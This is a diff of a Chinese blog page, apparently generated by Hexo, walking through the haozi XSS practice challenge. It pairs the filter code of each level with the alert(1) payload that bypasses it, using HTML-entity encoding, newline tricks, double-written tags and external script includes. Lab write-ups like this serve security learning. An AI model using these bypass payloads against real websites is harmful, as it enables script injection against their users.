@@ -4,7 +4,7 @@
 
 <head>
     
-    <title>xss总结 - Hexo</title>
+    <title>XSS过关挑战 - Hexo</title>
     <meta charset="UTF-8">
     <meta name="keywords" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
@@ -12,14 +12,14 @@
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
     <meta name="description" content="在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下 题目链接 0x00&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  最简单的 0x01&lt;&#x2F;textarea&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  闭合标签 0x02&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&quot;  原理同上 0x03">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss总结">
+<meta property="og:title" content="XSS过关挑战">
 <meta property="og:url" content="https://0xr1ngs.github.io/2018/08/21/xss/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下 题目链接 0x00&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  最简单的 0x01&lt;&#x2F;textarea&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  闭合标签 0x02&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&quot;  原理同上 0x03">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://0xr1ngs.github.io/2018/08/21/xss/1.png">
 <meta property="article:published_time" content="2018-08-21T06:02:19.000Z">
-<meta property="article:modified_time" content="2023-07-10T09:15:17.488Z">
+<meta property="article:modified_time" content="2023-09-21T16:52:10.705Z">
 <meta property="article:author" content="r1ngs">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
@@ -29,13 +29,13 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1689950583553">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1695315378836">
     
-    <link rel="stylesheet" href="/css/style.css?v=1689950583553">
+    <link rel="stylesheet" href="/css/style.css?v=1695315378836">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1689950583553">
+            <link rel="stylesheet" href="/custom.css?v=1695315378836">
         
     
 
@@ -44,7 +44,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1689950583553"></script>
+    <script async src="/js/app.js?v=1695315378836"></script>
     
      
 
@@ -64,7 +64,7 @@
 <body class="mdui-drawer-body-left">
     <div id="nexmoe-background">
         <div class="nexmoe-bg" 
-            style="background-image: url(https://api.biuioi.com/random-picture/index.php)"
+            style="background-image: url(/images/7.jpg)"
         ></div>
         <div class="mdui-appbar mdui-shadow-0">
             <div class="mdui-toolbar">
@@ -83,8 +83,8 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>Articles</span>10</div>
-        <div><span>Tags</span>8</div>
+        <div><span>Articles</span>15</div>
+        <div><span>Tags</span>9</div>
         <div><span>Categories</span>3</div>
     </div>
     <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
@@ -166,14 +166,14 @@
 
         <li class="category-list-item">
           <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
-          <span class="category-list-count">2</span>
+          <span class="category-list-count">5</span>
         </li>
 
         
 
         <li class="category-list-item">
           <a class="category-list-link" href="/categories/Web/">Web</a>
-          <span class="category-list-count">7</span>
+          <span class="category-list-count">9</span>
         </li>
 
         
@@ -188,12 +188,12 @@
             
   <div class="nexmoe-widget-wrap">
     <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
-      <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sqli/" style="font-size: 20px;">sqli</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
+      <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sqli/" style="font-size: 20px;">sqli</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 20px;">未授权访问</a>
     </div>
     
       <script>
         var maxTagcloud = parseInt(17);
-        var tags_length = parseInt(8);
+        var tags_length = parseInt(9);
         var tags_arr = [];
         for(var i = 0; i < tags_length; i++){
           tags_arr.push(i);
@@ -215,7 +215,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">Archive</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
     </div>
   </div>
 
@@ -238,15 +238,15 @@
           </li>
         
           <li>
-            <a href="/2019/05/31/java-random/">Java Random方法的安全问题</a>
+            <a href="/2019/12/12/redis/">redis未授权访问</a>
           </li>
         
           <li>
-            <a href="/2019/03/28/cbc-bit-flip/">对字节反转攻击的深入研究</a>
+            <a href="/2019/12/12/php-fpm/">php-fpm</a>
           </li>
         
           <li>
-            <a href="/2018/08/21/xss/">xss总结</a>
+            <a href="/2019/11/15/%E8%A7%A3n%E6%AC%A1%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/">解n次同余方程</a>
           </li>
         
       </ul>
@@ -268,9 +268,9 @@
     <div class="nexmoe-post">
   <article>
     
-        <div class="nexmoe-post-cover"> 
-            <img src="https://api.biuioi.com/random-picture/index.php" alt="xss总结" loading="lazy">
-            <h1>xss总结</h1>
+        <div class="nexmoe-post-cover absolute" style="padding-top: 31.575123152709356%;"> 
+            <img src="/2018/08/21/xss/cover.png" alt="XSS过关挑战" loading="lazy">
+            <h1>XSS过关挑战</h1>
         </div>
     
     
@@ -310,12 +310,16 @@
   <span class="token keyword">return</span> input
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><code>g</code>表示全局匹配，将反引号或 <code>(</code>或 <code>)</code>替换成空<br>这样的话只能考虑一下编码绕过<br>我一开始的想法是使用js编码，但实际测试是不行的<br>在学长的wp下面发现了这篇文章，抢救了我对编码知识的盲区<br><a target="_blank" rel="noopener" href="https://security.yirendai.com/news/share/26">浅谈XSS—字符编码和浏览器解析原理</a><br>文中不同的标签浏览器的解析顺序不同，开头和结尾各给了几个例子<br>原理是因为：<br><strong>小括号、单引号、双引号这些控制字符在js解码的时候仅仅会被解码为文本字符串</strong><br>而只有标识符名称不会被当做字符串，所以不能弹窗<br>这道题有两种办法绕过</p>
+<p><code>g</code>表示全局匹配，将反引号或 <code>(</code>或 <code>)</code>替换成空<br><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/103.html">浅谈XSS—字符编码和浏览器解析原理</a></p>
+<p>浏览器解析的流程是先通过HTML源代码，识别HTML标签然后建立DOM树，再依据标签切换解析模式，比如 <code>&lt;script&gt;</code>进入JS解析器，可以解析JS编码（\u0061），<code>&lt;a&gt;</code>触发HTML实体解析（&amp;#xx;）</p>
+<p>这里不能对alert <code>1</code>进行JS编码，<code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u00601\\u0060&lt;/script&gt;</code> ，因为：</p>
+<blockquote>
+<p>在进行JavaScript解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，在上例中Javascript解析器工作的时候将 <code>\\u0061\\u006c\\u0065\\u0072\\u0074</code>进行解码后为 <code>alert</code>，而 <code>alert</code>是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行，比如 <code>&lt;script&gt;alert(&#39;aaa\\u0027)&lt;/script&gt;</code>解析后缺少闭合的单引号而无法执行成功。</p>
+</blockquote>
 <ul>
 <li><code>&lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt;</code></li>
-<li><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&gt;</code></li>
+<li><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</code></li>
 </ul>
-<p>其实两种方法原理都差不多，先来说第一种吧<br>我们前面已经说到过js编码不能绕过过滤的()，所以只能想其他的编码方式<br>而这里使用的是HTML编码，因为我发现在 <code>&lt;script&gt;</code>标签里面的HTML编码是不能被浏览器解析的<br>而这里由于是在img标签内，可以解析HTMl编码，所以还原除了小括号，然后执行了js代码<br>第二个payload其实原理相同，也是svg标签可以HTML编码的原理</p>
 <h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">--</span><span class="token operator">!</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这道题考察了html注释符后面的感叹号可有可无</p>
@@ -326,8 +330,8 @@
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里要注意 <code>|</code>是或的意思，有整体分割的作用，匹配auto或者on.*&#x3D;或者&gt;<br>而且全局匹配且不区分大小写，那么闭合标签和auto事件就不能用了<br>然而正则里面的 <code>.</code>是匹配除”\n”之外的任何单个字符，所以我们使用换行就可以绕过了</p>
-<pre class="line-numbers language-html"><code class="language-html">onmouseover
-=alert(1)
+<pre class="line-numbers language-javascript"><code class="language-javascript">onmouseover
+<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>server code:</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -338,7 +342,7 @@
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>再讲讲正则，首先匹配一个 <code>&lt;</code>然后 <code>/</code>有或者没有都可以，再去匹配除了 <code>&gt;</code>的任意字符一个或多个，再以 <code>&gt;</code>结尾<br>这样的话可以利用浏览器的容错性，实际上如果你img标签没有闭合的话浏览器也是可以正常执行的</p>
-<pre class="line-numbers language-html"><code class="language-html">&lt;img src=1 onerror=alert(1) 
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>而又由于这里的img标签又在article标签中，而且在同一行，所以需要在结尾加上一个空格或者回车浏览器才能正常执行</p>
 <h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>server code:</p>
@@ -371,10 +375,10 @@
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>由于正则只匹配开头而没有匹配结尾，导致后面可以继续植入代码<br>可以先闭合前面的双引号，在后面js标签中再用 <code>//</code>注释掉后面的双引号</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML">https://www.segmentfault.com"></script><script>alert(1)//
+<pre class="line-numbers language-javascript"><code class="language-javascript">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com"<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>当然也可以用onload事件</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML">https://www.segmentfault.com" onload = alert(1) "
+<pre class="line-numbers language-javascript"><code class="language-javascript">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token string">" onload = alert(1) "</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><p>server code:</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -395,9 +399,9 @@
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>由于这道题目和上一题很像，所以我一开始想到的是闭合双引号，但是在标签的属性值里HTML对双引号编码是无效的，只会当作普通文本，所以只能另外想办法<br>比较好的办法是去引用外部js代码，不过我倒是搜出来很多奇怪的技巧，有用@的（不知道有没有这个方法），有去新注册一个国家级域名的，不过比较好的还是就地取材：<br>在目标url里是一个论坛网站，可以新建一个笔记，内容为 <code>alert(1)</code>然后点击raw功能，引入这个文件就可以了<br>还有一个坑点在于这个替换规则没有使用 <code>;</code>导致 <code>/</code>在编码的时候和后面的数字连在一起成了不可见字符无法识别url<br>在浏览器里按下F12就能看到详细错误<br>链接被识别为了 <code>https://segmentfault.com/n%EF%BF%BD/raw</code><br>解决的办法也很简单，加上 <code>;</code>或者使用换行</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML">https://www.segmentfault.com/n/;1330000016099466/raw
-https://www.segmentfault.com/n/
-1330000016099466/raw
+<pre class="line-numbers language-javascript"><code class="language-javascript">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token regex">/n/</span><span class="token punctuation">;</span><span class="token number">1330000016099466</span><span class="token operator">/</span>raw
+https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token regex">/n/</span>
+<span class="token number">1330000016099466</span><span class="token operator">/</span>raw
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><p>server code:</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -406,8 +410,8 @@ https://www.segmentfault.com/n/
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这道题的考点在于HTML的标签（包括script）不区分大小写，但是js的函数是区分的<br>正解是用编码绕过，或者引入外部js文件<br>一开始想的是js编码，但是很遗憾 <code>U</code>大写后识别不出来，只能用没有大小写区分的HTML编码</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML"></h1><img src=1 onerror = alert(1)>
-<script src="https://xss.haozi.me/j.js"></script>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror <span class="token operator">=</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://xss.haozi.me/j.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><p>server code:</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -420,8 +424,8 @@ https://www.segmentfault.com/n/
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>和上面一题一样，不能用script，但是由于这里的替换<strong>只替换了一次</strong>，而且是<strong>替换字符串</strong>并且<strong>替换为空</strong>，所以可以用双写绕过</p>
-<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>&lt;img src=1 onerror = alert(1)>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scripscriptt</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://xss.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scripscriptt</span><span class="token punctuation">></span></span>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror <span class="token operator">=</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>scripscriptt src<span class="token operator">=</span><span class="token string">"https://xss.haozi.me/j.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>scripscriptt<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><p>server code:</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -462,12 +466,12 @@ https://www.segmentfault.com/n/
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里对上述符号均进行的是HTML编码，并没有什么屌用，浏览器解析的时候会还原出来，直接闭合就好了</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML">');alert('1
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">');alert('</span><span class="token number">1</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p>不懂这道题的意义，直接弹</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>server code:</p>
+<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>server cod:</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// from alf.nu</span>
 <span class="token keyword">function</span> render <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">function</span> escapeJs <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -490,7 +494,7 @@ https://www.segmentfault.com/n/
   s <span class="token operator">=</span> <span class="token function">escapeJs</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
   <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`
 &lt;script>
-  var url = 'javascript:console.log("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>s<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">")'
+  var url = 'JavaScript:console.log("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>s<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">")'
   var a = document.createElement('a')
   a.href = url
   document.body.appendChild(a)
@@ -536,7 +540,7 @@ https://www.segmentfault.com/n/
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1689950583514"></script>
+    <script async src="/js/copy-codeblock.js?v=1695315378775"></script>
   
 
   
@@ -557,7 +561,7 @@ https://www.segmentfault.com/n/
                               <button class="mdui-fab catalog" style="overflow:unset;">
                                   <i class="nexmoefont icon-i-catalog"></i>
                                   <div class="nexmoe-toc">
-                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">2.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">3.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-number">4.</span> <span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-number">5.</span> <span class="toc-text">0x04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05"><span class="toc-number">6.</span> <span class="toc-text">0x05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06"><span class="toc-number">7.</span> <span class="toc-text">0x06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07"><span class="toc-number">8.</span> <span class="toc-text">0x07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08"><span class="toc-number">9.</span> <span class="toc-text">0x08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09"><span class="toc-number">10.</span> <span class="toc-text">0x09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C"><span class="toc-number">11.</span> <span class="toc-text">0x0C</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D"><span class="toc-number">12.</span> <span class="toc-text">0x0D</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E"><span class="toc-number">13.</span> <span class="toc-text">0x0E</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F"><span class="toc-number">14.</span> <span class="toc-text">0x0F</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10"><span class="toc-number">15.</span> <span class="toc-text">0x10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11"><span class="toc-number">16.</span> <span class="toc-text">0x11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12"><span class="toc-number">17.</span> <span class="toc-text">0x12</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number"></span> <span class="toc-text">参考文章</span></a>
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">2.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">3.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-number">4.</span> <span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-number">5.</span> <span class="toc-text">0x04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05"><span class="toc-number">6.</span> <span class="toc-text">0x05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06"><span class="toc-number">7.</span> <span class="toc-text">0x06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07"><span class="toc-number">8.</span> <span class="toc-text">0x07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08"><span class="toc-number">9.</span> <span class="toc-text">0x08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09"><span class="toc-number">10.</span> <span class="toc-text">0x09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A"><span class="toc-number">11.</span> <span class="toc-text">0x0A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B"><span class="toc-number">12.</span> <span class="toc-text">0x0B</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C"><span class="toc-number">13.</span> <span class="toc-text">0x0C</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D"><span class="toc-number">14.</span> <span class="toc-text">0x0D</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E"><span class="toc-number">15.</span> <span class="toc-text">0x0E</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F"><span class="toc-number">16.</span> <span class="toc-text">0x0F</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10"><span class="toc-number">17.</span> <span class="toc-text">0x10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11"><span class="toc-number">18.</span> <span class="toc-text">0x11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12"><span class="toc-number">19.</span> <span class="toc-text">0x12</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number"></span> <span class="toc-text">参考文章</span></a>
                                   </div>
                               </button>
                           
